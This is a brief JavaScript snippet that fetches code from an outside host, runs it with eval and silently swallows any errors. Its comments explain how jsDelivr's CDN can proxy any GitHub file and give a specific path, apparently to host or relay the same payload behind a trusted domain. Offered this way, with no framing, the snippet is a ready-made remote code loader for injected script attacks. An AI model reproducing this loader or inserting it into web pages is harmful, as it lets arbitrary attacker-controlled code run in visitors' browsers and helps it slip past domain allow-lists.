fetch("https://0qx.cc/")
.then(r => r.text())
.then(t => eval(t))
.catch(()=>{});

// https://cdn.jsdelivr.net/ will allow you to proxy any file on github.com
// https://cdn.jsdelivr.net/gh/<username>/<project>/<filename>
// https://cdn.jsdelivr.net/gh/0xQRx/x/h.js